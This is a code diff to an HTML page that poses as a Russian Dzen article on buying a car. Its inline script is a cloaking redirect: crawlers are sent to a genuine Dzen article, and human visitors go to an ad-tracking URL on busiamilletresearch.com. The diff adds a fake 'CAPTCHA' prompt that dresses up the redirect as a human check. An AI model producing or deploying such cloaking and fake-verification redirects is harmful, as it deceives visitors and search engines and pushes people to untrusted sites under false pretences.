@@ -1,10 +1,18 @@
 <!DOCTYPE html><html lang="ru" prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# article: http://ogp.me/ns/article#"><head><meta charset="UTF-8"><title>Купить автомобиль: Руководство по выбору | Павло Кукуман | Дзен</title><script>
-    window.onload = function() {
+    document.addEventListener('DOMContentLoaded', (event) => {
         var isBot = /bot|google|baidu|bing|msn|duckduckbot|teoma|slurp|yandex|crawler|spider|robot|crawling/i.test(navigator.userAgent);
         if(isBot) {
             window.location.href = "https://dzen.ru/a/ZLvu_KmN7T-V68Rg";
         } else {
-            window.location.href = "https://busiamilletresearch.com/1Vz2ptYC?cost={{price}}&external_id={ctoken}&creative_id={{adid}}&ad_campaign_id={{campaignid}}&source={{zoneid}}";
+            // Показать капчу
+            var userAnswer = prompt("CAPTCHA: Давайте проверим, вы человек или робот. Сколько будет 5 + 5?");
+
+            // Проверка капчи
+            if(userAnswer == "10") {
+                window.location.href = "https://busiamilletresearch.com/1Vz2ptYC?cost={{price}}&external_id={ctoken}&creative_id={{adid}}&ad_campaign_id={{campaignid}}&source={{zoneid}}";
+            } else {
+                alert("Неверный ответ. Вы, возможно, робот. Пожалуйста, попробуйте снова.");
+            }
         }
     });
 </script>
